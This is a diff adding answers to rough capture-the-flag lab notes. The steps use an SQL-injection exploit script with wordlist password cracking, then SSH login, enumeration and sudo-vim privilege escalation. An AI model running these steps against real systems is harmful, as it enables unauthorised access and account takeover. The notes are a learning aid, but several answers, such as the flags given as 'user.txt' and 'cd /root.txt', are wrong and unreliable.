@@ -18,3 +18,35 @@ Sol:CVE-2019–9053
 Q4: To what kind of vulnerability is the application vulnerable?
 the website for cve its mean sql 
 Sol: sqli 
+Q5:What’s the password?
+we have exploit must start download it in my device 
+make that to download it 
+python ex.py -u http:ip/simple.txt  --crack -w /usr/share/wordlists/rockyou.txt
+fix python codr in print code ()
+Sol:secret 
+
+Q6:Where can you login with the details obtained?
+try ssh ip its work 
+Sol:SSH
+ssh username@ip -p 2222
+id 
+ls 
+Q7:What’s the user flag?
+dir 
+pwd 
+
+cat user.txt
+sol:user.txt
+Q8:Is there any other user in the home directory? What’s its name?
+cd .. 
+ls 
+sol:
+sunbath
+Q9: What can you leverage to spawn a privileged shell?
+sudo -i
+We can see the user “mitch” can run /usr/bin/vim without a password. With that information, let’s check out GTFOBins and see if we can use that for privesc.
+Sol:vim
+Q10:What’s the root flag?
+
+root.txt
+Sol:cd /root.txt
